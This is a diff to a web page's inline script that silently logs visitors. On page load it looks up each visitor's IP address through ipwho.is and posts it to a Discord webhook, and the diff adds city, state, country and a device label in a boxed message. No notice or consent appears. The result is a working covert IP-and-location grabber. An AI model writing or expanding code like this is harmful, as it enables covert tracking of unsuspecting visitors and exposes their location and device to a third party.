@@ -31,14 +31,35 @@
         return; // No valid webhook configured yet.
       }
 
-      var userAgent = navigator.userAgent || "unknown";
+      // Turn the raw browser string into a simple device label.
+      function deviceType() {
+        var ua = navigator.userAgent || "";
+        if (/iPhone/i.test(ua)) return "iPhone";
+        if (/iPad/i.test(ua)) return "iPad";
+        if (/Android/i.test(ua)) return "Android";
+        return "PC";
+      }
 
-      function send(ip, city) {
-        var message =
-          "**New visit**\n" +
-          "IP: " + ip + "\n" +
-          "City: " + city + "\n" +
-          "Browser: " + userAgent;
+      // Draw an ASCII box around the lines, padded to the widest line.
+      function boxed(lines) {
+        var width = 0;
+        lines.forEach(function (l) { if (l.length > width) width = l.length; });
+        function pad(l) {
+          return "║ " + l + new Array(width - l.length + 1).join(" ") + " ║";
+        }
+        var top = "╔" + new Array(width + 3).join("═") + "╗";
+        var bottom = "╚" + new Array(width + 3).join("═") + "╝";
+        return "```\n" + top + "\n" + lines.map(pad).join("\n") + "\n" + bottom + "\n```";
+      }
+
+      function send(ip, city, state, country) {
+        var message = boxed([
+          "IP:      " + ip,
+          "City:    " + city,
+          "State:   " + state,
+          "Country: " + country,
+          "Device:  " + deviceType()
+        ]);
         try {
           fetch(DISCORD_WEBHOOK_URL, {
             method: "POST",
@@ -51,13 +72,18 @@
       }
 
       // A static page can't read its own IP/location, so ask a lookup service.
-      // ipwho.is returns the IP and an approximate city in one call.
+      // ipwho.is returns the IP, city, region (state), and country in one call.
       fetch("https://ipwho.is/")
         .then(function (r) { return r.json(); })
         .then(function (data) {
-          send(data.ip || "unknown", data.city || "unknown");
+          send(
+            data.ip || "unknown",
+            data.city || "unknown",
+            data.region || "unknown",
+            data.country || "unknown"
+          );
         })
-        .catch(function () { send("unknown", "unknown"); });
+        .catch(function () { send("unknown", "unknown", "unknown", "unknown"); });
     })();
   </script>
 </body>
